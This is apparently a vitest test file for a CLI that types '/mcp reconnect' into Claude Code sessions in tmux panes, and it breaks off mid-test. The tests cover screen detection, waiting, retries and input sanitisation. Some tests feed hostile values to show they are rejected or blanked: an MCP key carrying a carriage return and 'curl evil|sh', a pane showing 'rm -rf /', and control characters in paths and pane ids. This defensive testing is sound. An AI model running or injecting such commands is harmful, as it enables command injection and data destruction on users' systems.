import { describe, it, expect, vi } from "vitest";
import {
	composerState,
	parseWait,
	reconnect,
	safeKey,
	undimmed,
	MAX_WAIT_MS,
	RECONNECT_HELP,
	WAIT_POLL_MS,
	WAIT_UNIT
} from "../src/cli/reconnect.ts";
import { brokerKeyOf, mcpEntry, SkippedFolder } from "../src/cli/mcp-config.ts";
import { TmuxTimeout, type Pane, type TmuxServer } from "../src/cli/tmux.ts";
import { makeDeps, config, GROUPS } from "./helpers/cli-deps.mjs";

const DIR = "/run/gh-broker/agents";
const SOCK = "/tmp/tmux-1000/default";
const claude = (u: string) => `/home/${u}/.claude.json`;
const entry = JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR) } });

// Captured from live Claude Code panes (tmux capture-pane -p -J, this machine, 2026-11-21; the
// SGR escapes `-e` now keeps are left out where they don't matter),
// excerpted to the relevant region; rule lines shortened to 40 columns, trailing column padding
// stripped. The current TUI keeps the empty input box ("❯") visible while it works, its working
// indicator is a spinner-glyph line ("✻ Waiting for 1 background agent to finish") with no
// ellipsis and no "esc to interrupt", and a finished turn shows "✻ … · done <time>".
const RULE = "────────────────────────────────────────";
const IDLE = `❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

❯ /mcp reconnect all
  ⎿  Reconnected 1 of 1 MCP server

${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
const BUSY = `✻ Waiting for 1 background agent to finish

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle) · ↓ to manage

  ● main
  ◯ general-purpose  Addressing round-1 review blockers in tmux.ts    54s · ↓ 240.5k tokens`;
const DONE = `✻ Baked for 29s · done 9:55 AM
                                  new task? /clear to save 865.3k tokens

${RULE}
❯
${RULE}
  ⏵⏵ bypass permissions on (shift+tab to cycle)`;
// A draft whose first line is blank (shift+enter first): the text sits under the "❯" line.
const BLANK_FIRST_DRAFT = `${RULE}
❯
  this is the second line of the draft
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// A working-indicator line wrapped by a narrow pane (what capture without -J returns): the glyph
// line's first fragment carries no ellipsis at all.
const WRAPPED_BUSY = `✻ Fixing the flaky test in
src/agents.ts… (esc to
interrupt · 32s)`;
// A shell's PS2 continuation: the bottom-most ">" line is empty while the shell owns the tty.
const PS2_SHELL = `$ for f in *; do
>
`;
// The installed Claude Code (2.1.326) rotates its spinner through "*", "·" and "✢" frames too
// whenever TERM isn't xterm-ghostty — i.e. always inside tmux; a capture on the "*" frame used to
// read idle (roughly one capture in six, and the re-capture often lands on the same frame).
const STAR_FRAME = `* Considering what to do next

${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// A working-indicator shape the glyph list doesn't know, sitting directly above the composer's
// top rule: the box is still empty, so it is sent to.
const ABOVE_RULE = `⌛ Crunching the numbers
${RULE}
❯
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;
// The live box as \`capture-pane -e\` returns it (this machine, 2026-11-22): "❯" plus a no-break
// space, with Claude Code's prompt suggestion in SGR 2 (dim). Above it, the user's earlier message
// in the transcript ("❯" plus a plain space, its own colours) and the reply under it.
const SUGGESTION = `\x1b[38;5;246m\x1b[48;5;237m❯ \x1b[38;5;231mServer upgrade is mine?\x1b[39m
\x1b[39m● Yes. The upgrade needs root.

\x1b[38;5;244m${RULE}\x1b[39m
\x1b[39m❯\u00a0\x1b[2mcontinue\x1b[0m
\x1b[38;5;244m${RULE}\x1b[39m
\x1b[38;5;211m  ⏵⏵ bypass permissions on\x1b[38;5;246m (shift+tab to cycle)\x1b[39m
\x1b[39m  ● main
  ◯ general-purpose  Cleaning up helper worktrees    5h 6m 9s · ↓ 398.7k tokens`;
// A session drawn in truecolour (glmtest's panes, 2026-11-22): the rule is \e[38;2;136;136;136m,
// and the cursor sits in the empty box as a reverse-video space.
const TRUECOLOR_IDLE = `\x1b[38;2;153;153;153m✻\x1b[39m \x1b[38;2;153;153;153mCogitated for 14s · done 12:45 PM · 1 shell still running\x1b[39m
\x1b[38;2;136;136;136m${RULE}
\x1b[39m❯\u00a0\x1b[7m 
\x1b[0m\x1b[38;2;136;136;136m${RULE}
\x1b[39m  \x1b[38;2;255;107;128m⏵⏵ bypass permissions on\x1b[38;2;153;153;153m · \x1b[38;2;0;204;204m1 shell\x1b[38;2;153;153;153m · ↓ to manage\x1b[39m`;
// The same box with text typed into it: not dim.
const TYPED_NBSP = `${RULE}
\x1b[39m❯\u00a0rerun the tests\x1b[39m
${RULE}`;
// A draft whose continuation lines start with "?" or "●" — the footer detector must not stop on them.
const DRAFT_QUESTION = `${RULE}
❯
  ? why does the socket drop
  ● and list the suspects
${RULE}
  ⏵⏵ accept edits on (shift+tab to cycle)`;

describe("undimmed", () => {
	it("drops dim text and every escape, keeping the rest", () => {
		expect(undimmed("\x1b[39m❯\u00a0\x1b[2mcontinue\x1b[0m")).toBe("❯\u00a0");
		expect(undimmed("a\x1b[2mb\x1b[22mc\x1b[2md\x1b[me")).toBe("ace");
		expect(undimmed("\x1b[1;2mdim bold\x1b[0;1m bold")).toBe(" bold");
		expect(undimmed("\x1b[38;5;246m\x1b[48;5;237m❯ \x1b[38;5;231mhi\x1b[39m")).toBe("❯ hi");
		expect(undimmed("\x1b[2mnever reset")).toBe("");
		expect(undimmed("x\x1b[2Ky")).toBe("xy");
		expect(undimmed("plain")).toBe("plain");
		// a colour's own arguments aren't attributes: the 2 in 38;2;r;g;b is truecolour, not dim
		expect(undimmed("\x1b[38;2;136;136;136m────\x1b[39m")).toBe("────");
		expect(undimmed("\x1b[48;2;2;2;2mtyped\x1b[0m")).toBe("typed");
		expect(undimmed("\x1b[38;5;2mgreen\x1b[39m")).toBe("green");
		expect(undimmed("\x1b[38;2;1;2;3;2mdim after colour\x1b[0m")).toBe("");
		expect(undimmed("\x1b[38:2::1:2:3mcolon form\x1b[0m")).toBe("colon form");
		expect(undimmed("\x1b[38;9mx")).toBe("x");
	});
});

describe("composerState (heuristic over Claude Code's screen)", () => {
	it("reads the live input line", () => {
		expect(composerState(IDLE)).toBe("empty");
		expect(composerState(BUSY)).toBe("empty"); // the current TUI keeps the box visible while working, and what is typed queues
		expect(composerState(STAR_FRAME)).toBe("empty");
		expect(composerState(ABOVE_RULE)).toBe("empty");
		expect(composerState(WRAPPED_BUSY)).toBe("none");
		expect(composerState(DONE)).toBe("empty");
		expect(composerState(`❯ /mcp reconnect all`)).toBe("typing");
		expect(composerState("> /mcp")).toBe("typing");
	});

	it("reads a dim prompt suggestion in the live box as empty, not the transcript message above it as typing", () => {
		expect(composerState(SUGGESTION)).toBe("empty");
		expect(composerState(TYPED_NBSP)).toBe("typing");
		expect(composerState(TRUECOLOR_IDLE)).toBe("empty");
	});

	it("sees a draft whose first line is blank", () => {
		expect(composerState(BLANK_FIRST_DRAFT)).toBe("typing");
	});

	it("a permission dialog reads as typing (skipped — the safe direction), a prompt-less screen as none", () => {
		expect(composerState("Do you want to proceed?\n❯ 1. Yes\n  2. No (esc)")).toBe("typing");
		expect(composerState("!\n  ! for bash mode")).toBe("none");
		expect(composerState("")).toBe("none");
	});

	it("a draft whose continuation starts with ? or ● is still typing — only the known footers stop the scan", () => {
		expect(composerState(DRAFT_QUESTION)).toBe("typing");
	});

	it("takes the bottom-most prompt line, so a user message in the transcript doesn't count", () => {
		expect(composerState(`${IDLE}\n❯ and one more thing`)).toBe("typing");
	});

	it("the PS2 continuation reads empty — the foreground check is what protects that pane", () => {
		expect(composerState(PS2_SHELL)).toBe("empty");
	});
});

describe("safeKey", () => {
	it("allows the names mcp-config writes, and nothing that could carry a newline or a command", () => {
		for (const k of ["github", "gh-broker", "gh-broker-repo", "A.b_c-9"]) expect(safeKey(k)).toBe(true);
		for (const k of ["github\r!curl evil|sh", "a\nb", "with space", "tab\there", "ünïcode", "", "x".repeat(65), "../etc"])
			expect(safeKey(k)).toBe(false);
	});
});

describe("brokerKeyOf (what mcp-config wrote, read back)", () => {
	it("reads the broker entry's key out of a .claude.json text, or none", () => {
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { github: mcpEntry("repo", DIR), x: { command: "npx" } } }), DIR)).toBe("github");
		expect(brokerKeyOf(JSON.stringify({ mcpServers: { x: { command: "npx" } } }), DIR)).toBeUndefined();
		expect(brokerKeyOf("{nope", DIR)).toBeUndefined();
		expect(brokerKeyOf("[]", DIR)).toBeUndefined();
		expect(brokerKeyOf(undefined, DIR)).toBeUndefined();
	});
});

describe("agent reconnect", () => {
	const info = { uid: 1000, gid: 1000, home: "/home/repo" };
	/** Deps whose tmux has `panes` on SOCK; tmuxPaneText re-captures `fresh` (an idle screen by default; `null` means the pane is gone). */
	const SERVER: TmuxServer = { socket: SOCK, binary: "/usr/bin/tmux" };
	function withPanes(
		panes: Pane[],
		over: Record<string, unknown> = {},
		files: Record<string, string> = {},
		fresh: string | null = "❯ \n",
		dead: { socket: string; why: string }[] = []
	) {
		return makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [SERVER], skipped: dead })),
				tmuxPanes: vi.fn(() => panes),
				tmuxPaneText: vi.fn(() => (fresh === null ? undefined : fresh)),
				...over
			},
			{ [claude("repo")]: entry, ...files }
		);
	}
	const pane = (id: string, text: string, over: Partial<Pane> = {}): Pane => ({
		id,
		pid: 200,
		text,
		foreground: true,
		inMode: false,
		synchronized: false,
		session: "main",
		cwd: "/home/repo",
		...over
	});

	describe("--wait", () => {
		const TYPING = "❯ half a sentence";
		it("parses seconds and minutes up to 30m", () => {
			expect(parseWait("90")).toBe(90_000);
			expect(parseWait("90s")).toBe(90_000);
			expect(parseWait("5m")).toBe(300_000);
			expect(parseWait("30m")).toBe(MAX_WAIT_MS);
			for (const bad of ["31m", "0", "0s", "5h", "-5", "5 m", "", "1.5m", "99999"]) expect(parseWait(bad)).toBeUndefined();
		});

		it("refuses a missing or bad time", () => {
			const { d } = withPanes([pane("%1", IDLE)]);
			expect(() => reconnect(["--wait"], config, d)).toThrow("--wait takes a time up to 30m");
			expect(() => reconnect(["--wait", "forever"], config, d)).toThrow("--wait takes a time up to 30m");
			expect(() => reconnect(["--wait=45m"], config, d)).toThrow("--wait takes a time up to 30m");
		});

		it("waits for a pane with text in its input box and sends once it clears", () => {
			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", IDLE)]);
			// first re-capture is for %2's pre-send check; then %1 is polled: still typing, then clear
			d.tmuxPaneText.mockReturnValueOnce(IDLE).mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
			expect(reconnect(["repo", "--wait", "1m", "--foreground"], config, d)).toBe(0);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (composer not empty, or a dialog is showing)`);
			expect(out).toContain("waiting up to 1m for 1 pane to clear");
			// %1 is sent to from the waiting loop, which carries the location computed at selection
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
			expect(d.tmuxSend).toHaveBeenCalledTimes(2);
			expect(d.sleep).toHaveBeenCalledTimes(2);
			expect(d.sleep).toHaveBeenCalledWith(WAIT_POLL_MS);
			expect(out[out.length - 1]).toBe("sent 2, skipped 0");
		});

		it("skips a pane still blocked at the deadline, with the reason and how long it waited", () => {
			const { d, out } = withPanes([pane("%1", "Do you want to proceed?\n1. Yes")], {}, {}, "Do you want to proceed?\n1. Yes");
			expect(reconnect(["repo", "--wait=12s", "--foreground"], config, d)).toBe(3);
			expect(d.tmuxSend).not.toHaveBeenCalled();
			// 5s, 5s, then the 2s left: never past the deadline
			expect(d.sleep.mock.calls.map((c: number[]) => c[0])).toEqual([5000, 5000, 2000]);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (no Claude Code prompt on screen; still after waiting 12s)`);
			expect(out).toContain("waiting up to 12s for 1 pane to clear");
		});

		it("waits on a pane that changed between the check and the send", () => {
			const { d, out } = withPanes([pane("%1", IDLE)]);
			d.tmuxPaneText.mockReturnValueOnce(TYPING).mockReturnValueOnce(IDLE);
			expect(reconnect(["repo", "--wait", "30s", "--foreground"], config, d)).toBe(0);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github waiting (changed since capture)`);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
		});

		it("drops a pane that disappears while waiting, retries one whose capture times out, and counts a failed send as skipped", () => {
			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", TYPING), pane("%3", TYPING)]);
			// rounds poll the list back to front: %3, %2, %1
			d.tmuxPaneText
				.mockReturnValueOnce(IDLE) // %3 clears; its send fails
				.mockImplementationOnce(() => {
					throw new TmuxTimeout("tmux timed out");
				}) // %2: tmux timed out this round
				.mockReturnValueOnce(undefined) // %1 gone
				.mockReturnValueOnce(IDLE); // %2 next round: clear
			d.tmuxSend.mockImplementationOnce(() => {
				throw new Error("pane is dead");
			});
			expect(reconnect(["repo", "--wait", "1m", "--foreground"], config, d)).toBe(3);
			expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (send failed: pane is dead)`);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (gone while waiting)`);
			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
			expect(out[out.length - 1]).toBe("sent 1, skipped 2");
		});

		it("lets an unexpected tmux error through", () => {
			const { d } = withPanes([pane("%1", TYPING)]);
			d.tmuxPaneText.mockImplementationOnce(() => {
				throw new Error("boom");
			});
			expect(() => reconnect(["repo", "--wait", "1m", "--foreground"], config, d)).toThrow("boom");
		});

		it("hands the blocked panes to a background run and returns without waiting", () => {
			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", IDLE)]);
			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
			expect(d.sleep).not.toHaveBeenCalled();
			expect(d.startBackground).toHaveBeenCalledWith(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`]);
			expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
			expect(out).toContain(`waiting up to 1m in the background for 1 pane to clear: journalctl -u ${WAIT_UNIT} -f`);
			expect(out[out.length - 1]).toBe("sent 1, skipped 0, waiting on 1 in the background");
		});

		it("waits here when the background run can't be started", () => {
			const { d, out, err } = withPanes([pane("%1", TYPING)]);
			d.startBackground.mockImplementationOnce(() => {
				throw new Error("systemd-run: not found");
			});
			d.tmuxPaneText.mockReturnValueOnce(IDLE);
			expect(reconnect(["repo", "--wait", "1m"], config, d)).toBe(0);
			expect(err).toContain("couldn't start the background wait (systemd-run: not found); waiting here instead");
			expect(d.sleep).toHaveBeenCalledTimes(1);
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
		});

		it("a background run touches only the panes it was handed", () => {
			const { d, out } = withPanes([pane("%1", TYPING), pane("%2", IDLE)]);
			d.tmuxPaneText.mockReturnValueOnce(IDLE);
			expect(reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`], config, d)).toBe(0);
			expect(d.tmuxSend).toHaveBeenCalledTimes(1);
			expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%1", "/mcp reconnect github", info);
			// the background run's waiting loop carries the location too
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
			expect(d.startBackground).not.toHaveBeenCalled();
			expect(out.some((l: string) => l.includes("%2"))).toBe(false);
			expect(out[out.length - 1]).toBe("sent 1, skipped 0");
		});

		it("a background run says so when its panes are gone", () => {
			const { d, out } = withPanes([pane("%2", IDLE)]);
			expect(reconnect(["--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`], config, d)).toBe(0);
			expect(out).toContain("repo: the panes waited on are gone");
			expect(d.tmuxSend).not.toHaveBeenCalled();
		});

		it("refuses --foreground without --wait, and --retry outside the background run", () => {
			const { d } = withPanes([pane("%1", IDLE)]);
			expect(() => reconnect(["--foreground"], config, d)).toThrow("--foreground is for --wait");
			expect(() => reconnect(["--wait", "1m", "--retry", `repo:%1@${SOCK}`], config, d)).toThrow(
				"--retry is for the background --wait run"
			);
			expect(() => reconnect(["repo", "--wait", "1m", "--foreground", "--retry", `repo:%1@${SOCK}`], config, d)).toThrow(
				"--retry is for the background --wait run"
			);
			for (const bad of ["repo:%1", "repo:1@/s", "Repo:%1@/s", "repo:%1@rel", ""])
				expect(() => reconnect(["--wait", "1m", "--foreground", "--retry", bad], config, d)).toThrow(
					"--retry takes <user>:<pane>@<socket>"
				);
			expect(() => reconnect(["--wait", "1m", "--foreground", "--retry"], config, d)).toThrow("--retry takes");
		});

		it("refuses a --retry for an agent that isn't registered", () => {
			const { d } = withPanes([pane("%1", IDLE)]);
			expect(() => reconnect(["--wait", "1m", "--foreground", "--retry", `nobody:%1@${SOCK}`], config, d)).toThrow(
				'"nobody" is not a registered agent'
			);
		});

		it("doesn't wait on a dry run", () => {
			const { d, out } = withPanes([pane("%1", TYPING)]);
			expect(reconnect(["repo", "--dry-run", "--wait", "1m"], config, d)).toBe(3);
			expect(d.sleep).not.toHaveBeenCalled();
			expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
		});
	});

	it("sends /mcp reconnect with the agent's own key, as the agent, and lists it as sent", () => {
		const { d, out } = withPanes([pane("%3", IDLE), pane("%4", IDLE, { foreground: false })]);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(d.tmuxSockets).toHaveBeenCalledWith(info);
		expect(d.tmuxPanes).toHaveBeenCalledWith(SERVER, info, DIR);
		expect(d.tmuxPaneText).toHaveBeenCalledWith(SERVER, "%3", info);
		expect(d.tmuxSend).toHaveBeenCalledTimes(1);
		expect(d.tmuxSend).toHaveBeenCalledWith(SERVER, "%3", "/mcp reconnect github", info);
		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github sent`);
		expect(out).toContain(`repo ${SOCK} %4 (main, /home/repo) github skipped (claude is not the pane's foreground job)`);
		expect(out[out.length - 1]).toBe("sent 1, skipped 1");
	});

	it("--dry-run lists what it would send where, sends nothing, and doesn't re-capture", () => {
		const { d, out } = withPanes([pane("%3", IDLE)]);
		expect(reconnect(["repo", "--dry-run"], config, d)).toBe(0);
		expect(d.tmuxSend).not.toHaveBeenCalled();
		expect(d.tmuxPaneText).not.toHaveBeenCalled();
		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github would send`);
		expect(out[out.length - 1]).toBe('dry run: 1 pane(s) would get "/mcp reconnect"');
	});

	it("re-captures before sending: a pane gone or typed into since the check is skipped, one that started working is still sent to", () => {
		const gone = withPanes([pane("%1", IDLE)], {}, {}, null);
		expect(reconnect(["repo"], config, gone.d)).toBe(3);
		expect(gone.out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (gone since capture)`);
		expect(gone.d.tmuxSend).not.toHaveBeenCalled();
		const busy = withPanes([pane("%2", IDLE)], {}, {}, BUSY);
		expect(reconnect(["repo"], config, busy.d)).toBe(0);
		expect(busy.out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
		const typed = withPanes([pane("%3", IDLE)], {}, {}, "❯ rm -rf /\n");
		expect(reconnect(["repo"], config, typed.d)).toBe(3);
		expect(typed.out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (changed since capture)`);
	});

	it("skips copy mode and synchronize-panes before anything else", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { inMode: true }), pane("%2", IDLE, { synchronized: true })]);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (pane is in copy mode)`);
		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) - skipped (synchronize-panes is on)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("sends to a working pane and one showing a prompt suggestion; skips one with text in the composer, a dialog, and one without a prompt", () => {
		const { d, out } = withPanes([
			pane("%1", BUSY),
			pane("%2", "❯ fix the reconnect test"),
			pane("%3", "Do you want to proceed?\n1. Yes\n2. No (esc)"),
			pane("%4", SUGGESTION),
			pane("%5", "Do you want to proceed?\n❯ 1. Yes\n  2. No (esc)")
		]);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
		expect(out).toContain(`repo ${SOCK} %4 (main, /home/repo) github sent`);
		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
		expect(out).toContain(`repo ${SOCK} %5 (main, /home/repo) github skipped (composer not empty, or a dialog is showing)`);
		expect(out).toContain(`repo ${SOCK} %3 (main, /home/repo) github skipped (no Claude Code prompt on screen)`);
	});

	it("skips a pane whose CLAUDE_CONFIG_DIR has no broker entry, and never borrows another folder's key", () => {
		const SAVED = "/data/claude-saved";
		const saved = JSON.stringify({ mcpServers: { "gh-broker": mcpEntry("repo", DIR) } });
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: "/home/repo/.claude-alt" })]),
				mcpIO: {
					read: (p: string) =>
						p === `${SAVED}/.claude.json` ? { text: saved, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined,
					write: () => {}
				}
			},
			{ [claude("repo")]: JSON.stringify({ mcpServers: { x: { command: "npx" } } }), [`${SAVED}/.claude.json`]: saved }
		);
		// The session's own folder has no entry, and neither has the home file; the saved folder has
		// one, but its key may be wrong for this session — skipped with the sync named, not borrowed.
		expect(reconnect(["repo"], { ...config, claudeConfigDirs: { repo: [SAVED] } }, d)).toBe(3);
		expect(out).toContain(
			`repo ${SOCK} %1 (main, /home/repo) - skipped (its CLAUDE_CONFIG_DIR /home/repo/.claude-alt is not a config folder the broker manages: sudo gh-broker agent sync repo --claude-config /home/repo/.claude-alt)`
		);
	});

	it("skips a pane whose config folder has no broker entry even when the home file has one (#270)", () => {
		const ALT = "/home/repo/.claude-alt";
		const noEntry = JSON.stringify({ mcpServers: { x: { command: "npx" } } });
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE, { configDir: "/opt/claude-unregistered" })]),
				mcpIO: {
					read: (p: string) =>
						p === claude("repo")
							? { text: entry, stat: { uid: 1000, gid: 1000, mode: 0o100600 } }
							: p === `${ALT}/.claude.json`
								? { text: noEntry, stat: { uid: 1000, gid: 1000, mode: 0o100600 } }
								: undefined,
					write: () => {},
					scan: (home: string) => (home === "/home/repo" ? [ALT] : [])
				}
			},
			{ [claude("repo")]: entry, [`${ALT}/.claude.json`]: noEntry }
		);
		// The home file has the entry, but neither session runs with it: %1's config folder is known
		// to the broker and has no broker entry in its file, %2's is a folder the broker was never
		// told about — both are skipped with the sync that fixes each, and the home key is not
		// borrowed (it is the home session's key, not theirs).
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(
			`repo ${SOCK} %1 (main, /home/repo) - skipped (its CLAUDE_CONFIG_DIR ${ALT} has no broker MCP entry: sudo gh-broker agent sync repo --claude-config ${ALT})`
		);
		expect(out).toContain(
			`repo ${SOCK} %2 (main, /home/repo) - skipped (its CLAUDE_CONFIG_DIR /opt/claude-unregistered is not a config folder the broker manages: sudo gh-broker agent sync repo --claude-config /opt/claude-unregistered)`
		);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("skips a session with no config folder when even the home file has no broker entry", () => {
		const noEntry = JSON.stringify({ mcpServers: { x: { command: "npx" } } });
		const { d, out } = withPanes([pane("%1", IDLE)], {}, { [claude("repo")]: noEntry });
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (no broker MCP entry in its .claude.json file)`);
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("sends the key from the session's own config folder, and the home file's only to a session with no config folder", () => {
		const ALT = "/home/repo/.claude-alt";
		const files = {
			[claude("repo")]: entry,
			[`${ALT}/.claude.json`]: JSON.stringify({ mcpServers: { "gh-broker-repo": mcpEntry("repo", DIR) } })
		};
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE, { configDir: ALT }), pane("%2", IDLE)]),
				mcpIO: {
					read: (p: string) => (files[p] === undefined ? undefined : { text: files[p], stat: { uid: 1000, gid: 1000, mode: 0o100600 } }),
					write: () => {},
					scan: (home: string) => (home === "/home/repo" ? [ALT] : [])
				}
			},
			files
		);
		// %2 runs with no CLAUDE_CONFIG_DIR, so the home file's key is its key; %1 gets its own
		// folder's, never the home file's.
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) gh-broker-repo sent`);
		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
	});

	it("blank control characters out of a config folder in the skip reason", () => {
		const { d, out } = withPanes([pane("%1", IDLE, { configDir: "/tmp/evil\rdir" })]);
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(
			`repo ${SOCK} %1 (main, /home/repo) - skipped (its CLAUDE_CONFIG_DIR /tmp/evil?dir is not a config folder the broker manages: sudo gh-broker agent sync repo --claude-config /tmp/evil?dir)`
		);
		expect(out.join("\n")).not.toContain("\r");
	});

	it("refuses to type a key that could carry a newline or a command, and logs no part of it", () => {
		const evil = JSON.stringify({ mcpServers: { "github\r!curl evil|sh": mcpEntry("repo", DIR) } });
		const { d, out } = withPanes([pane("%1", IDLE)], {}, { [claude("repo")]: evil });
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) - skipped (unsafe MCP key)`);
		expect(out.join("\n")).not.toContain("evil");
		expect(d.tmuxSend).not.toHaveBeenCalled();
	});

	it("blank control characters out of a socket path in the log line, and refuse an unsafe pane id", () => {
		const { d, out } = withPanes([pane("%1", IDLE)], {
			tmuxSockets: vi.fn(() => ({ servers: [{ socket: "/tmp/tmux-1000/evil\rsock", binary: "tmux" }], skipped: [] }))
		});
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo /tmp/tmux-1000/evil?sock %1 (main, /home/repo) github sent");
		const badId = withPanes([pane("%1\r!x", IDLE)]);
		expect(reconnect(["repo"], config, badId.d)).toBe(3);
		expect(badId.out.join("\n")).toContain("skipped (unsafe pane id)");
	});

	it("carries on when a folder root won't be read", () => {
		const BROKEN = "/home/repo/.claude-broken";
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [{ socket: SOCK, binary: "tmux" }], skipped: [] })),
				tmuxPanes: vi.fn(() => [pane("%1", IDLE)]),
				mcpIO: {
					read: (p: string) => (p === claude("repo") ? { text: entry, stat: { uid: 1000, gid: 1000, mode: 0o100600 } } : undefined),
					write: () => {},
					scan: () => [BROKEN],
					pin: (folder: string) => {
						throw new SkippedFolder(`${folder} is owned by uid 0, not the agent user (uid 1000)`);
					}
				}
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
	});

	it("lists panes from every tmux server the agent runs, with the socket in the line", () => {
		const OTHER: TmuxServer = { socket: "/home/repo/.tmux/claude", binary: "tmux" };
		const { d, out } = makeDeps(
			{
				tmuxSockets: vi.fn(() => ({ servers: [SERVER, OTHER], skipped: [] })),
				tmuxPanes: vi.fn((server: TmuxServer) =>
					server.socket === SOCK ? [pane("%1", IDLE)] : server.socket === OTHER.socket ? [pane("%7", IDLE)] : []
				)
			},
			{ [claude("repo")]: entry }
		);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github sent`);
		expect(out).toContain(`repo ${OTHER.socket} %7 (main, /home/repo) github sent`);
	});

	it("covers every registered agent when none is named", () => {
		const { d, out } = makeDeps({}, { [claude("repo")]: entry });
		expect(reconnect([], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running (no tmux server)");
		expect(out).toContain("glmtest: no Claude Code sessions running (no tmux server)");
	});

	it("says when a tmux server runs but no pane is Claude Code", () => {
		const { d, out } = withPanes([]);
		expect(reconnect(["repo"], config, d)).toBe(0);
		expect(out).toContain("repo: no Claude Code sessions running");
		expect(out[out.length - 1]).toBe("sent 0, skipped 0");
	});

	it("keeps going when a send fails, counts it as skipped, and sanitises the tmux error", () => {
		const { d, out } = withPanes([pane("%1", IDLE), pane("%2", IDLE)], {
			tmuxSend: vi.fn((_s: unknown, p: string) => {
				if (p === "%1") throw new Error("server exited unexpectedly\x1b[31m\x9b and a C1 CSI");
			})
		});
		expect(reconnect(["repo"], config, d)).toBe(3);
		expect(d.tmuxSend).toHaveBeenCalledTimes(2);
		expect(out).toContain(`repo ${SOCK} %1 (main, /home/repo) github skipped (send failed: server exited unexpectedly?[31m? and a C1 CSI)`);
		expect(out.join("\n")).not.toContain("\x1b");
		expect(out.join("\n")).not.toContain("\x9b");
		expect(out).toContain(`repo ${SOCK} %2 (main, /home/repo) github sent`);
	});

	it("counts sockets with no owning tmux process on one line, without counting them as skipped", () => {
		const one = [{ socket: "/tmp/tmux-1000/stale", why: "no server process for this socket" }];
		const a = withPanes([pane("%1", IDLE)], {}, {}, "❯ \n", one);
